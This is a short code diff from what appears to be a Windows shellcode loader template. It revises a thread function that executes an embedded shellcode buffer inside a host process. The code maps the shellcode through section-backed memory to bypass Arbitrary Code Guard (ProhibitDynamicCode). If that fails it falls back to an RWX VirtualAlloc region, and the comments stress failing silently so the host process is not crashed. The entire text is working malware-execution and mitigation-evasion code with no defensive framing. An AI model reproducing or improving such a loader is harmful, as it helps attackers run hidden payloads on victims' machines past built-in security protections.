@@ -117,25 +117,25 @@ static DWORD WINAPI _ScThread(LPVOID p)
 {{
     (void)p;
 
-    /* Primary path: section-mapped memory (bypasses ProhibitDynamicCode) */
+    /* Primary path: section-mapped memory (bypasses ProhibitDynamicCode /
+       ACG because the memory is backed by a section object, not a plain
+       VirtualAlloc RWX region). */
     if (_exec_via_section()) return 0;
 
-    /* Fallback: classic VirtualAlloc RWX – wrapped in SEH so a policy
-       violation (STATUS_DYNAMIC_CODE_BLOCKED / 0xC0000906) does not
-       propagate as an unhandled exception and crash the host process. */
-    __try {{
-        LPVOID m = VirtualAlloc(NULL, sizeof(_sc),
-                                MEM_COMMIT | MEM_RESERVE,
-                                PAGE_EXECUTE_READWRITE);
-        if (!m) return 1;
-        for (SIZE_T i = 0; i < sizeof(_sc); i++)
-            ((unsigned char *)m)[i] = _sc[i];
-        ((void (*)(void))m)();
-        VirtualFree(m, 0, MEM_RELEASE);
-    }}
-    __except(EXCEPTION_EXECUTE_HANDLER) {{
-        /* blocked by policy – fail silently so the host process survives */
-    }}
+    /* Fallback: classic VirtualAlloc RWX for targets without ACG.
+       If the policy is active, VirtualAlloc returns NULL and we exit
+       silently rather than crashing the host process.
+       Note: __try/__except is not available in MinGW GCC; targets that
+       raise STATUS_DYNAMIC_CODE_BLOCKED as a hard exception (not NULL
+       return) require the section path above instead. */
+    LPVOID m = VirtualAlloc(NULL, sizeof(_sc),
+                            MEM_COMMIT | MEM_RESERVE,
+                            PAGE_EXECUTE_READWRITE);
+    if (!m) return 1;
+    for (SIZE_T i = 0; i < sizeof(_sc); i++)
+        ((unsigned char *)m)[i] = _sc[i];
+    ((void (*)(void))m)();
+    VirtualFree(m, 0, MEM_RELEASE);
     return 0;
 }}
 
